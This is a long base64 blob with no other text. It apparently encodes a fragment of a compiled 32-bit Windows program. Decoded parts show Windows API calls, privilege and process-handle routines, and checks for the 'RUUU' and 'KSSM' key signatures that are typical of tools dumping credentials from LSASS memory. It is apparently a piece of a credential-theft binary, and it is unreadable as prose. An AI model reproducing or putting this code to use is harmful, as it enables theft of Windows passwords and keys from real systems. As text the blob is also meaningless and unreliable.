dzoGE4AAOsVUGgY9QEQ6wZQaHD1ARDoJXT//1lZ/0XYi0XYg8cMO0W8D4Kq/f//vwUBAAD/deTo4k0AADl9rA+ETv3///91+OjLTQAA6w1QaDj2ARDo5nP//1lZ/3XU6LpNAADrDVBokPYBEOjPc///WVn/RcyLRcyDRdAMO0W4D4Kn/P///3XI6JBNAABowHcBEOioc///WTl9qA+ERPz//19eOV30dAj/dfToZ00AAP916OhfTQAA6w1QaID3ARDoenP//1lZM8BbycMzwMNRVo1EJARQagBqAWoU6PxNAACL8IX2fBBqFGhA+AEQ6Exz//9ZWesQVmoUaGj4ARDoO3P//4PEDIvGXlnDagBoiK8AEOgPd///WVnDVYvsi0UIg+wQVzP/O8d0S4tNDFaLdIH8Vmgk+gEQ6AFz//9qAY1F8FBXV1dXVlczwOjYfv//g8QoXoXAdAr/dfhoVPoBEOsM/xXEYQEQUGh4+gEQ6Mty//9ZWTPAX8nDagD/dCQM/3QkDOgqAAAAg8QMw2oB/3QkDP90JAzoFwAAAIPEDMNqAv90JAz/dCQM6AQAAACDxAzDVYvsg+wMi00QVjP2K864JQIAwFeJRfx0Jkl0FUkPheAAAAC/AAgAAMdF+ED7ARDrGL8ACAAAx0X4HPsBEOsKM/9Hx0X49PoBEFNWjUX0UGiMyAEQ/3UM/3UI6BaQ//+DxBSFwHQSVlb/dfT/FTBjARCDxAyL2OsDi10QO950dVNWV/8VyGEBEIv4O/50UotFECvGdBZIdAtIdSlX6IJMAADrD1fohkwAAOsHVlfog0wAADvGiUX8fAtT/3X4aGD7ARDrC/91/P91+GiQ+wEQ6Ldx//+DxAxX/xXQYQEQ6x//FcRhARBQaPj7ARDomnH//1nrCmh4/AEQ6I1x//9Zi0X8W19eycOLRCQEjUg4Uf9wRGj8/AEQ6G9x//8zwIPEDEDCCABof7AAEP90JAz/dCQM6BoAAACDxAzDaDmxABD/dCQM/3QkDOgEAAAAg8QMw1WL7FFRU1Yz9laNRfhQaIzIARD/dQyJdfz/dQgz2+gBj///g8QUhcB0OFZW/3X4Q/8VMGMBEIPEDFBWaAAAAID/FchhARCJRfw7xnUV/xXEYQEQUGgQ/QEQ6Nxw//9ZWetFV/91/I19+OjqZ///WV+FwHQXVot1+P91EIvG6Il1//9ZWehdaP//6xP/FcRhARBQaJD9ARDonnD//1lZ/3X8/xXQYQEQXjPAW8nDVot0JAj/dhBoGP4BEOh7cP///3QkFGiqsAAQVug1ff//g8QUM8BAXsIIAFaLdCQIV/92BP92FGgk/gEQ6Exw//+DxAyDfgwAv0T+ARB0EP92CGg8/gEQ6DFw//9Z6wZX6Chw//+LRhxZhcB0DlBoTP4BEOgVcP//WesGV+gMcP//i0YMWYXAdA5QaFT+ARDo+W///1nrBlfo8G///4t2EFmF9nQNVmhc/gEQ6N1v//9ZWTPAX0BewggAVot0JAj/dhBoGP4BEOjBb////3QkFFboJH7//4PEEDPAQF7CCABWi3QkCP92BP92GP92EGhs/gEQ6JVv//+LRgyDxBCFwHQIUGiQ/gEQ6wj/dghomP4BEOh2b///WVkzwEBewggA/zb/dCQMaIT/ARDoXW////82/1QkFIPEEIXAdAxorP8BEOhGb///6xL/FcRhARBQaLj/ARDoM2///1lZM8DDg3wkBAB0GFaLdCQMaJAAAhBo2joAEOim////WVlew2ggAAIQ6AVv//9ZM8DDg3wkBAB0GFaLdCQMaKQAAhBoJTsAEOh5////WVlew2ggAAIQ6Nhu//9ZM8DDg3wkBAB0GFaLdCQMaLgAAhBoyzsAEOhM////WVlew2ggAAIQ6Ktu//9ZM8DDg3wkBAB0GFaLdCQMaMwAAhBo3DsAEOgf////WVlew2ggAAIQ6H5u//9ZM8DDg3wkBAB0GFaLdCQMaOQAAhBo7TsAEOjy/v//WVlew2ggAAIQ6FFu//9ZM8DDaBgEAhDoQ27//1m4FQAAQMNVi+yD7CBWavX/FVxhARCL8DPAZolF/GaJRf6NReBQVv8VVGEBEA+/TeCNRfhQD79F4v91/A+vwVBqIFb/FVhhARD/dfxW/xVgYQEQM8BeycNoJAQCEOjhbf//WTPAwzPAVjlEJAh0FVBQi0QkFP8w/xUwYwEQg8QMi/DrBb7oAwAAVmgwBAIQ6K9t//9ZWVb/FWRhARBoVAQCEOicbf//WTPAXsNWi3QkDFcz/1dXaHT5ARBW/3QkHOhoi///g8QUhcB1Dzl8JAx0BIs+6wW/ZAQCEOgjbv//hcC46LMBEHUFuPCzARBQV2iABAIQ6Elt//+DxAxfM8Bew4M9hHUCEABWV7+8BAIQvsgEAhCLx3UCi8ZQaNQEAhDoHW3//zPAOQWEdQIQWQ+UwFmjhHUCEIXAdAKL91ZoFAUCEOj6bP//WVlfM8Bew1WL7FGNRfxQ/xXMYQEQUP8VUGEBEIXAdDCDffwAuFQFAhB1BbhcBQIQUP81CHcCEP81AHcCEP81BHcCEGhoBQIQ6K1s//+DxBQzwMnDVYvsUVFWV2jIBwIQ6JVs//9ZjUX8UGoI/xXMYQEQUP8VVGABEIs1xGEBEIs90GEBEIXAdBD/dfzoygIAAFn/dfz/1+sP/9ZQaPAHAhDoVGz//1lZaGAIAhDoSGz//1mNRfxQagFqCP8VTGEBEFD/FdRgARCFwHQQ/3X86IcCAABZ/3X8/9frJP/WPfADAAB1DGiICAIQ6Ats///rDv/WUGigCAIQ6Pxr//9ZWV8zwF7Jw4tEJAiLTCQEagDoFwAAAFkzwMOLRCQIi0wkBGoB6AQAAABZM8DDVYvsg+wcU1ZXi/iLRQgz9laJRfCNRehQaCB9ARCL2VdTiXXkiXXoiXXsiXX8iXX46IOJ//9WjUX0UGj8igEQV1Pocon//4PEKFZWhcB0FP919P8VMGMBEIPEDIlF7OmTAAAAaAwJAhBXU+hJif//g8QUhcB0KY1F+FDHRfwpAAAA6Lhh//9ZhcB1a/8VxGEBEFBoKAkCEOgya///WetWVlZoyIoBEFdT6AuJ//+DxBSFwHQJx0X8GgAAAOs5OXUIdAU5deh0FVZWaOAJAhBXU+jjiP//g8QUhcB0GsdF/BYAAAA5deh0DmjwCQIQ6Nxq//+JdehZOXUIdBM5dex1Djl1/HUJOXXoD4TrAAAAi0XoO8Z1BbgofgEQUP917GiACgIQ6KZq//+DxAw5dfx0fItF+DvGdAWLQCjrAjPAUP91/I1d5OhAYf//WVmFwHROjUX0UP915I19/Ojxif//WVmFwHQl/3X8/3X0aNgKAhDoWWr//4s97GEBEIPEDP91/P/X/3X0/9frLf8VxGEBEFBo6AoCEOgzav//WesY/xXEYQEQUGiQCwIQ6+powHcBEOgYav//WWjAdwEQ6A1q//9ZOXUIdA85dex1Cjl15HUFOXXodBaNReToEIr//zl15HQJ/3Xk/xXsYQEQOXX4dAj/dfjog0MAAF9eM8BbycNqAGoA/xXYYAEQhcB0C2oAagDoEf3//+sR/xXEYQEQUGhIDAIQ6KRp//9ZWTPAw1WL7IPsUFaNRexQajiNRbRQagr/dQj/FVhgARCFwA+ElwAAAP91tGi0DAIQ6G5p//+NRfBQjUX0UI1F+FD/dQjoWIj//4PEGIXAdCv/dfD/dfj/dfRoxAwCEOhAaf//izXsYQEQg8QQ/3X4/9b/dfT/1v918P/Wi0XM/zSFCG0CEP914P913GjYDAIQ6A5p//+DxBCDfcwCdRaLRdD/NIX4bAIQaPwMAhDo8Wj//1lZaMB3ARDo5Wj//1leycNVi+yD5PiD7ExTVlcz/0eJfCQM/xVIYQEQOUUMD4RjAQAAjUQkHFBqOI1EJChQagr/dQj/FVhgARCFwA+ERAEAAIt1EDPbOV4EdElTjUQkHFCNRCQcUP91COiBh///g8QQhcB0Q/92BP90JBj/FTxjARCLPexhARBZ99hZ/3QkFBvAQIlEJBD/1/90JBj/1zP/R+sUi0YIO8N0DTPJO0QkIA+UwYlMJAw5XCQMD4TPAAAAOXwkOHUFagNY6wSLRCQ8jUwkEFFqAlBTagz/dQj/FdxgARCFwA+EpAAAAIsGiz3EYQEQO8N0J41MJAxRUP90JBiJXCQY/xXgYAEQhcB1D//XUGgIDQIQ6NNn//9ZWTlcJAx0V/91DGikDQIQ6L5n////dQjoF/7//4PEDDleDHRC/3QkEFP/FdhgARCFwHQaaKwNAhDolWf//1lTU+jn+v//WVmJXCQM6xn/11Bo2A0CEOh4Z///WVnrCMdEJAwBAAAA/3QkEP8V0GEBEOsEiXwkDItEJAxfXluL5V3CDABoQA8CEGhYDwIQagS5CGwCEOisaf//g8QMM8DDV2hMEQIQ/xVsYQEQM/+j+HUCEDvHD4TkAAAAVos1aGEBEGhgEQIQUP/WaHgRAhD/Nfh1AhCj/HUCEP/WaJARAhD/Nfh1AhCjAHYCEP/WaKARAhD/Nfh1AhCjBHYCEP/WaLQRAhD/Nfh1AhCjCHYCEP/WaMgRAhD/Nfh1AhCjDHYCEP/WaNgRAhD/Nfh1AhCjEHYCEP/WaOQRAhD/Nfh1AhCjFHYCEP/Woxh2AhCjHHYCEF45Pfx1AhB0Pjk9AHYCEHQ2OT0EdgIQdC45PQh2AhB0Jjk9DHYCEHQeOT0QdgIQdBY5PRR2AhB0DscFIHYCEAEAAAA7x3UGiT0gdgIQM8Bfw6H4dQIQhcB0B1D/FXBhARAzwMNVi+yD5PiD7ERTVlcz/zk9IHYCEA+EUgQAAI1EJEBQjUQkUFBX/xUAdgIQhcAPjC8EAACJfCQ8OXwkTA+GIQQAAIl8JDi7wHcBEGj0EQIQ6Mll//+LRCREi3QkPFkDxlDoLoP//1lT6LFl//9ZjUQkGFCLRCREVwPwVv8VBHYCEIXAD4zDAwAA/3QkGOhvBwAAWY1EJDRQjUQkNFBX/3QkJP8VDHYCEIXAD4yRAwAA/3QkMGgIEgIQ6GBl//9ZWYl8JBQ5fCQwD4ZpAwAAiXwkLIl8JCiBPQh3AhBAHwAAi0QkNA+DPAEAAItMJCiNNAH/dhD/dCQYaCQSAhDoHGX//4PEDGg8EgIQ6A9l//9ZVuh+gv//WVPoAWX//8cEJGgSAhDo9WT//1mNRiBQ6DiC//9ZU+jkZP//Wf92KGiUEgIQ6NZk//9oyBICEOjMZP//i0YUg8QM6D4HAABT6Ltk///HBCT0EgIQ6K9k//+LRhhZ6CMHAABT6KBk///HBCQgEwIQ6JRk//+LRhxZ6AgHAABT6IVk//8zwFk5Rix2MYlEJBxXaEwTAhDobmT//4tGMANEJCTo3wYAAFPoXGT//4NEJCggg8QMRzt+LHLVM8CNTCREUVBQiUQkUP92GP92FFb/dCQw/xUYdgIQaHgTAhCL8OgkZP//WYX2dQ6LRCREi0Ac6JAGAADrDVZoqBMCEOgGZP//WVlT6P5j//9Z6fMBAACLTCQsjTQB/3YQiXQkTP90JBhoJBICEOjcY///g8QMaDwSAhDoz2P//1lW6D6B//9ZU+jBY///xwQkaBICEOi1Y///WY1GJFDo+ID//1lT6KRj//9Z/3YsaJQSAhDolmP//2jIEgIQ6Ixj//+LRhSDxAzo/gUAAFPoe2P//8cEJPQSAhDob2P//4tGGFno4wUAAFPoYGP//8cEJCATAhDoVGP//4tGHFnoyAUAAFPoRWP//8cEJAgUAhDoOWP//4tGIFnorQUAAFPoKmP//zPAWTlGMHYxiUQkHFdoTBMCEOgTY///i0Y0A0QkJOiEBQAAU+gBY///g0QkKCCDxAxHO34wctUzwI1MJBBRUFCJRCQc/3Yg/3YY/3YUVv90JDT/FRx2AhBoeBMCEIlEJCjoxGL//4N8JCgAWXUOi0QkEItAHOgtBQAA6xD/dCQkaDgUAhDooGL//1lZU+iYYv//M8AhRCQkWcdEJBxQaQEQ6wSLdCRIi3wkHGoEWTPS86d0F4NEJCAYg0QkHBhAgXwkIJAAAABy2utJi/Br9hj/tmBpARBomBQCEOhKYv//i4ZkaQEQWVmFwHQog3wkJAB1CItMJBCFyXUCM8lqAVH/dCRQjY5QaQEQUf/QU+gXYv//WYN8JBAAdAr/dCQQ/xUUdgIQ/0QkFItEJBSDRCQoNINEJCw4M/87RCQwD4Kf/P///3QkNP8VFHYCEI1EJBhQ/xUQdgIQ/0QkPItEJDyDRCQ4EDtEJEwPguj7////dCRA/xUUdgIQX14zwFuL5V3DVYvsg+wgg2X8AFOLXQyLQxhWV4XAD4SAAQAAg3gICA+FdgEAAGi4FAIQ6Hlh//+NRfBQi0MY/3AUjX306OmA//+DxAyFwHQl/3X0/3XwaOQUAhDoUGH//4s17GEBEIPEDP919P/W/3Xw/9brDItDGP9wFOjXfv//WWjAdwEQ6CVh//+LRQiBOCuhuLRZD4UIAQAAizUkYAEQjUXgUGoIagBo8BQCEGgCAACA/9aFwA+F2QAAAI1F5FCLQxj/cBTodDoAAIsdLGABEIXAD4SfAAAAjUX4UGoBM/9X/3Xk/3Xg/9Y7x3VyizUYYAEQjUXoUFdXV7+UFQIQV/91+P/WhcB1Qv916GpA/xXoYQEQiUX8hcB0PY1F6FD/dfxqAGoAV/91+P/WhcB0KFBoqBUCEOhzYP//WVn/dfz/FexhARCJRfzrDVBocBYCEOhYYP//WVn/dfj/0+sNUGg4FwIQ6ERg//9ZWf915P8V7GEBEOsT/xXEYQEQUGgAGAIQ6CZg//9ZWf914P/Ti10M6w1QaNAYAhDoD2D//1lZi0UQhcB0YItIHIXJdFmDeQgIdVOLwWaLeBCLWBRorBkCEGaJfe5miX3siV3w6Ntf//9ZjXXs6AR7//9ThcB0DWjMdwEQ6MNf//9Z6wszwA+3z0DoIHz//1lowHcBEOiqX///i10MWYtDNIXAD4R3AQAAg3swAA+GbQEAAItNCIsJgfn1M+CyD4RFAQAAgfkrobi0dHCB+ZFyyP50D2gQHAIQ6GZf///pPAEAAIN4CAgPhTMBAACLcBSLPmjMGwIQA/7oRl///4tGCFmD+AF2FotOBI0MT1FIUGj4GwIQ6Cpf//+DxAyLdgSD/gF2EFdOVmgEHAIQ6BJf//+DxAxowHcBEOudg3gICA+F2gAAAItwFDPbOV38dBj/dfxoEBoCEOjnXv//WVn/dfz/FexhARBoQBoCEOjSXv//M/9Zg8YMV2iMGgIQ6MFe//+LRvRZWYvIK8t0Tkl0OUl0D1BoxBsCEOilXv//WVnrTLjYGgIQOV4EdQW47BoCEFD/Nv92/P92+GgIGwIQ6H9e//+DxBTrJf92BP82/3b8/3b4aGAbAhDr5P92/P92+GigGgIQ6Fhe//+DxAxowHcBEOhLXv//R4PGFFmD/wMPgnH////rF4N4CAJ1EQ+3QBBQaNgZAhDoJl7//1lZX15bycIQAFWL7IPsFFczwI197Kurq6urjUXsUGoA/3UIx0XsAQAAAP8VCHYCEIXAfBj/dfBoIBwCEOjlXf//WVn/dfD/FRR2AhAzwIE9CHcCEEAfAACNfeyrq6urqxvAg+AEg8AEiUXsjUXsUGoA/3UI/xUIdgIQX4XAfCKLRfCFwHUFuEQcAhBQaFwcAhDokF3//1lZ/3Xw/xUUdgIQycNWi/CF9nRpi04Ii8FISHRPSEh0QYPoA3QySHQfUWiQHAIQ6Fxd//+DxhBWM8BqBEBZ6Lh5//+DxAxew/92FItOEDPAQOilef//6yT/dhBozHcBEOsU/3YQaIgcAhDrCg+3RhBQaIAcAhDoFV3//1lZXsNVi+yD7HxTVlcz/41F3Il9/Il9+Il93Il94Il9zIlF0Il91IlF2Dk9JHYCEA+FRgEAAFdXaPDkARD/dQz/dQjot3r//4PEFIXAD4QpAQAA/zUIdwIQuchqAhBqBOgCX///i/BZWTv3D4QrAgAAi0YIiUXMi0YQiUXUjUWEUGj85AEQ6Px1//9ZWYXAD4TPAAAA/3WgV2g4BAAA/xXIYQEQO8cPhKoAAAAz21CNffRD6HtT//9ZhcAPhNsBAABoqBwCEP919I1FqOgMZP//WVmFwHRf/3UMi0Wo/3UIiUW8i0WsiUXAi0WwiUXEaPvDABD/dhSNRdT/dgyJHSR2AhBQ/3YEjUXMUI1FvOgKXf//g8QghcB1E/8VxGEBEFBowBwCEOjqW///WVmDJSR2AhAA6xP/FcRhARBQaCgdAhDozlv//1lZi3X06HBT///pRgEAAP8VxGEBEFBo4B0CEOsM/xXEYQEQUGhAHgIQ6KBb//9ZWekgAQAAjUX8UI1F7FD/dfhX/xXoYAEQhcAPhPAAAACJffQ5fewPhtsAAADrAjP/i0X8i030iwSIi1AEg/oHcwyLDJU0aQEQiU3w6wfHRfDIHgIQi0gMi9k7z3UFuwQfAhCLSDCL8TvPdQW+BB8CEItILDvPdQW5BB8CEItACDvHdQW4BB8CEP918FJTVlFQaBgfAhDoBVv//4tF/It99I0EuIsIi0kciU3oiwBmi0AYg8QcjXXkZolF5maJReToDXb//4XAdBCLxlBo1HcBEOjKWv//WesUi0X8iwy4/3Eci0kYM8BA6B53//9ZaMgfAhDoqFr//0dZiX30O33sD4Ip////M///dfz/FeRgARD/RfiDffgBdw2DPQR3AhAFD4fg/v//X14zwFvJw1WL7IPk+IPsQFaNRCQYVzP/OT2oagIQiUQkDI1EJBSJfCQUiXwkGIlEJBAPjV4BAAA5PSh2AhB1GGjQHwIQ/xVsYQEQoyh2AhA7xw+EPgEAAI1EJBRoqBwCEFCNRCQ86NZh//9ZWYXAD4QhAQAAi0QkNIlEJCSLRCQ4iUQkKItEJDyJRCQsOT0wdgIQdWqLNWhhARBo4B8CEP81KHYCEP/WiUQkIDvHdENo+B8CEP81KHYCEP/WiUQkHDvHdC5XjUQkKFCNRCQUaghQ6B1T//+DxBCFwHQVi0QkMItIbIkNLHYCEItAcKMwdgIQOT0wdgIQD4SXAAAAV41EJChQjUQkFGoHUMdEJByQagIQ6NtS//+DxBCFwHR2i0QkMItIB4tQFotwHItAJ4kN+HYCEIkV/HYCEIk19HYCEKPwdgIQO890SzvXdEc793RDO8d0P4s16GEBELkAAQAAUWpAiQj/1osN/HYCEGiQAAAAakCJAf/Wiw30dgIQiQGLDfx2AhA5OXQKO8d0Bok9qGoCEKGoagIQX16L5V3Dofx2AhBWizXsYQEQhcB0BP8w/9ah9HYCEIXAdAT/MP/WoSh2AhBehcB0B1D/FXBhARAzwMNVi+yD5PiD7CyLRQiLAFNWjUwkHFeJRCQUiUwkHItNDIsRiUQkLItBCDP/iUQkMFeNRCQsUI1EJCBqB1C7JQIAwIl8JDCJfCQ0iXwkIMdEJCiQagIQiVQkOIl8JETovFH//4PEEIXAD4SSAAAAi0QkNIPAB4lEJBCNRCQQagRQiUQkII1EJCBQ6PpP//+DxAyFwHRrofh2AhCJRCQYagiNRCQUUI1EJCBQ6NlP//+DxAyFwHRKi0QkNIPAHIlEJBCh9HYCEGiQAAAA/zCNdCQY6DMAAABZWYXAdCSLRCQ0g8AWiUQkEKH8dgIQaAABAAD/MOgRAAAAWVmFwHQCM9tfXovDW4vlXcNVi+yD7BRXjUXwagSJRfyNRfgz/1ZQiX3wiX30iXX46FtP//+DxAyFwHQragSNRfhWUOhIT///g8QMhcB0GItFCP91DIlF+I1F+FZQ6C5P//+DxAyL+IvHX8nDVzP/OT2EagIQD40JAQAAOT00dgIQD4WzAAAAaBQgAhD/FWxhARCjNHYCEDvHD4TlAAAAVos1aGEBEGgkIAIQUP/WaEAgAhD/NTR2AhCjOHYCEP/WaFQgAhD/NTR2AhCjPHYCEP/WaGggAhD/NTR2AhCjQHYCEP/WaIQgAhD/NTR2AhCjRHYCEP/WaJQgAhD/NTR2AhCjSHYCEP/WaKQgAhD/NTR2AhCjTHYCEP/WaLggAhD/NTR2AhCjUHYCEP/Wo1R2AhBeOT00dgIQdEo5PTh2AhB0Qjk9PHYCEHQ6OT1AdgIQdDI5PUR2AhB0Kjk9SHYCEHQiOT1MdgIQdBo5PVB2AhB0Ejk9VHYCEHQK6DIAAACjhGoCEKGEagIQX8ODPTR2AhAAdBqDPYRqAhAAfAXo/AAAAP81NHYCEP8VcGEBEDPAw1FWVzP/V1do2CACEGjgdgIQ/xU4dgIQi/A79w+MxgAAAFVXaiBo5CACEL0EIQIQVf814HYCEP8VPHYCEIvwO/cPjKAAAABTV41EJBRQagRo7HYCELsgIQIQU/814HYCEP8VQHYCEIvwO/d8ef817HYCEGpA/xXoYQEQV1doPCECEGjAdgIQo+h2AhD/FTh2AhCL8Dv3fE5XaiBoRCECEFX/NcB2AhD/FTx2AhCL8Dv3fDNXjUQkFFBqBGjMdgIQU/81wHYCEP8VQHYCEIvwO/d8E/81zHYCEGpA/xXoYQEQo8h2AhBbXV+Lxl5Zw6HgdgIQhcB0CWoAUP8VVHYCEKHkdgIQhcB0B1D/FVB2AhBW/zXodgIQizXsYQEQ/9ahwHYCEIXAdAlqAFD/FVR2AhChxHYCEIXAdAdQ/xVQdgIQ/zXIdgIQ/9Zew2oB/3QkDP90JAzoGwAAAIPEDMIIAGoA/3QkDP90JAzoBgAAAIPEDMIIAFWL7IsVSHYCEIPsEIN9EAB1BosVTHYCEPZFDAdWV77QdgIQjX3wpaWlpXQJuMR2AhBqEOsHuOR2AhBqCFlqAI11DFb/dQz/dQhRjU3wUWoA/3UM/3UI/zD/0l9eycNVi+yD5PiD7DRTVot1CIsGjUwkJIlMJCCLTQyLEYlEJBiJRCQwi0EIiUQkNItGCFcz/8dEJBQlAgDAiXwkKIl8JCyJfCQYiVQkMIl8JDyD+AJzEmq6uMxoAhDHRCQU8f///1vrGmrBg/gDx0QkFPT///9buGBqAhByBbhsagIQiUQkIFeNRCQ0UI1EJChqC1DoD03//4PEEIXAD4SMAAAAi0QkPIPAC4lEJBiNRCQYagRQiUQkKI1EJChQ6E1L//+DxAyFwHRlahCNRCQcUI1EJChQx0QkLNB2AhDoLUv//4PEDIXAdEWLRCQ8A9iJXCQYg8YEaOB2AhBWjVwkIOg0AAAAWVmFwHQji0QkPItMJBADyGjAdgIQVolMJCDoFQAAAFlZhcB0BIl8JBSLRCQUX15bi+Vdw1WL7IPsMDPAiUX0iUXkiUXojUXkiUXwi0UIi0AEVleJXeyD+AJzEMdFCCAAAADHRfwYAAAA6yOD+ANzEMdFCCgAAADHRfwgAAAA6w7HRQg8AAAAx0X8NAAAAP91CIs96GEBEGpA/9eL8Il1+IX2D4TnAAAAagSNRexTUOhWSv//g8QMhcAPhMkAAABqBI1F7FNQ6D9K//+DxAyFwA+EsgAAAI1F0GoUiUXsjUXsU1DoIkr//4PEDIXAD4SVAAAAgX3UUlVVVQ+FiAAAAItF3P91CIkDjUXsU1CJdezo9Un//4PEDIXAdGyBfgRLU1NNdWOLRfwD8P82akD/14lF7IXAdE6LRdyLTfyNRAgEiQP/No1F7FNQ6LtJ//+DxAyFwHQmi0UMagD/No1IBP917P9wDP9wCFH/MP8VRHYCEDPJhcAPncGJTfT/dez/FexhARCLdfhW/xXsYQEQi0X0X17Jw1FWV/81aHYCEP8V7GIBEIs1WHYCEIMlaHYCEABZhfZ0JIsGSHQDSHUHi0YEizjrBIt8JAjoA0n//1ejWHYCEP8V0GEBEDPSi7q8ZwEQagczwIPHEIPCBFnzq4P6IHLoX15Zw2jIJwIQ6CNR//9Z6I3///8zwMNo8CcCEOgQUf//g3wkCAFZdA1oICgCEOj+UP//Wesk6Gb///+LRCQI/zD/FfBiARBQaCi0ARCjaHYCEOjaUP//g8QMM8DDgz0EdwIQBscFsHYCEPRoARByCscFsHYCEAhpARAzwMOhsHYCEP9gBFWL7IPk+IPsHI1EJBRTiUQkDItFDFaLdQiJRCQYi0YUVzP/iXwkIIl8JCSJfCQQiXwkGKgED4SfAAAAqQABAAAPhZQAAACBfhgAAAIAD4WHAAAA/3YMiwZqQIlEJCD/FehhARCJRCQQO8d0bv92DI1EJBxQjUQkGFDoEkj//4PEDIXAdEuLfCQQi0YMA8frPIvX6Adr//+FwHQnjV8QjVP46Phq//+FwHQYi9Po7Wr//4XAdA1oAwAAIIvH6OgJAABZi0YMg8cEA0QkEDv4csD/dCQQ/xXsYQEQXzPAXkBbi+VdwggAagi4vGcBEOgdBgAAWcPoEwAAAIXAfAyhWHYCEFDoy1f//1kzwMOD7AxTVTPtVjP2V4lsJBSJbCQQOS1YdgIQD4VvAgAAobB2AhDHRCQUJQIAwP8QhcAPjE0CAAChaHYCEDvFdCpqAltQaLgoAhDoU0///1lZVVVqA1VqAWgAAACA/zVodgIQ/xX4YQEQ6yiNRCQYUDPbaAQpAhBD6LZT//9ZWYXAdBb/dCQYVWg6BAAA/xXIYQEQiUQkEOsLaBgpAhDo/07//1mLRCQQO8UPhKABAACD+P8PhJcBAABQv1h2AhDo/EX//1mFwA+EfAEAAIP7Ag+FhAAAAKFYdgIQi0AEixBqB+glS///WTvFdF6LeAiJPVx2AhCLSAyJDWB2AhCLSBAz0okNZHYCEIsNBHcCEDv5D5XCi/I79XQLUf9wCGiYKQIQ6xsPtwAzyWY7xQ+VwYvxO/V0UA+3wFVQaHAqAhDoXU7//4PEDOsuM/ZoYCsCEEboS07//1nrHqEEdwIQo1x2AhChAHcCEKNgdgIQoQh3AhCjZHYCEDv1D4XpAAAAiz1cdgIQgT1kdgIQQB8AABvAQKO4ZQIQg/8Gcw+DPWB2AhACiS18YwIQcwrHBXxjAhABAAAAoVh2AhBVaAbUABDorVL//1lZhcB8djktqGUCEHRugT1kdgIQzg4AAGoHWRvA99BVJXB2AhBQu5RlAhCL879kaAIQ86VobHYCEGoFv1h2AhBo2GgCEIvzi8/oswsAAIPEFIXAdCChsHYCEFNX/1AIO8VZWYlEJBR9YWj4KwIQ6GlN///rJ2hYLAIQ6/JouCwCEOvraDAtAhDr5P8VxGEBEFBomC0CEOhBTf//WTlsJBhZfSeLNVh2AhDo2kT///90JBCjWHYCEP8V0GEBEOsLaBguAhDoE03//1mLRCQUX15dW4PEDMNTVYtsJAxWVzPbi0UQ/3AEi4O8ZwEQ/3AM/xU8YwEQWVmFwHUdi4O8ZwEQx0AkAQAAAIu7vGcBEGoFg8cQWYv186WDwwSD+yBywF9eM8BdQFvCCABVi+yD5PiD7FxTjUQkDFYz24lEJByNRCQ0M/ZXiVwkFIlcJDiJXCQ8iUQkJIlcJDCJRCQ0RujY/P//O8OJRCQcD4wTAgAAobB2AhCJRCREoWR2AhDHRCRAWHYCED24CwAAcwe/+GcBEOs7PXAXAABzB78caAEQ6y09WBsAAHMHv0BoARDrHz1AHwAAcwe/ZGgBEOsRv6xoARA9uCQAAHIFv9BoARAFqOT//z1fCQAAdw+BPaBlAhAAAEhTdgODxyShWHYCEIlEJCyhcHYCEIlEJCg7w3QWagSNRCQsUI1EJChQ6K9D//+DxAzrBotEJCCJMIlcJBA5XCQUD4ZZAQAAix3sYQEQoWx2AhCLTCQQ/zeNBMiJRCQsjUQkHIlEJCSNRCQ8akCJRCQs/xXoYQEQiUQkMIXAD4QLAQAAagSNRCQsUI1EJChQ6ElD//+DxAyFwA+E6QAAAItMJCyLRCQYiUwkJOnKAAAAhfYPhNAAAAD/N41EJCRQjUQkOFDoFEP//4PEDIXAD4S0AAAAi0QkMItPBIt3EAPIiUwkSItPCIsMCIlMJFSLTwyLDAiJTCRYi08UA8iJTCRQi08YA/CJdCRMiwwIiUwkXItPHIsMCIlMJGCLTyCLBAiLDVh2AhCJRCRk6Ddm//+LDVh2AhCLdCRQ6Chm////NVh2AhCNdCRk6H4LAABZ/3UMjUQkRFD/VQiL8ItEJEz/cAT/04tEJFD/cAT/0/90JGD/04tEJDCLAIlEJCA7RCQoD4Uo/////3QkMP/T/0QkEItEJBA7RCQUD4Kt/v//i0QkHF9eW4vlXcOLRCQEg3gUA3RXVlfoVgAAAIt0JBAz/zl+BHZDiwaLBLiDeCQAdDKLDL28ZwEQg3kIAHQl/zBolC4CEOgOSv//iwaLBLhZWf90JAz/UARowHcBEOj2Sf//WUc7fgRyvV9eM8BAwggAVovw/3YQi0YI/3YMi1YU/3YYiwj/NJUEagIQi0AEUVBRUGioLgIQ6LtJ//+LdiCDxCSF9nQHVuhSZ///WWjAdwEQ6KBJ//9ZXsNVi+xRUYlF+ItFCIlF/I1F+FBovtYAEOjP/P//WVnJw1WL7IPk+IHstAAAAFNWi3UMV4t9CDPbjUQkcFOJRCQUjUQkNFBoIH0BEFZXiVwkKIlcJCyJXCQwiVwkNOgmZ///g8QUhcAPhBoDAABTjUQkMFBo1IoBEFZX6Aln//+DxBSFwA+E9gIAAGis7wEQjUQkLFBoxC8CEFZX6Ohm//+DxBT/dCQo/3QkMP90JDho0C8CEOjlSP//U41EJCBQaBgwAhBWV+i9Zv//g8QkvsB3ARCFwHRYgT0IdwIQWBsAAHJBjUQkSFCLRCQQahBf6Lpk//9ZhcB0JI1EJEhoKDACEIlEJCDok0j//1n/dCQcM8BXWejwZP//WVbrDGhAMAIQ6wVo0DACEOhwSP//WVONRCQQUGiQMQIQ/3UM/3UI6ENm//+DxBSFwHRegT0IdwIQWBsAAHJHjYQkoAAAAFCLRCQQaiBf6EJk//9ZhcB0J42EJKAAAABooDECEIlEJBzoGEj//1n/dCQYM8CLz+h1ZP//WVbrDGi4MQIQ6wVoSDICEOj1R///WVONRCQQUGgIMwIQ/3UM/3UI6Mhl//+DxBSFwHRFjUQkWFCLRCQQahBf6NZj//9ZhcB0JI1EJFhoFDMCEIlEJBjor0f//1n/dCQUM8BXWegMZP//WVbrBWgoMwIQ6JNH//9ZOVwkFHUWOVwkHHUQOVwkGHUKaNg1AhDpZAEAAFONRCQ4UGgofgEQ/3QkOP90JEBqAv90JEBqAmoEWOg9U///g8QghcAPhBYBAAD/dCRA/3QkQGiwMwIQ6DZH//+DxAyNRCQkUGgIAAIA/3QkPP8VVGABEIs90GEBEIXAD4SfAAAAjUQkRFBqOI1EJHBQagr/dCQ0/xVYYAEQhcB0aP90JHD/dCR4/3QkeP+0JIAAAABo6DMCEOjYRv//g8QUaCg0AhDoy0b//1mNRCQQUGg49gAQ6An6//9W6LVG//+DxAxoTDQCEOioRv//WY1EJBBQaJbsABDo5vn//1bokkb//4PEDOsT/xXEYQEQUGhwNAIQ6HxG//9ZWf90JCT/1+sT/xXEYQEQUGjoNAIQ6GFG//9ZWTlcJCB0C/90JDTo6CAAAOsOaBUAAED/dCQ46OogAAD/dCQ4/9f/dCQ0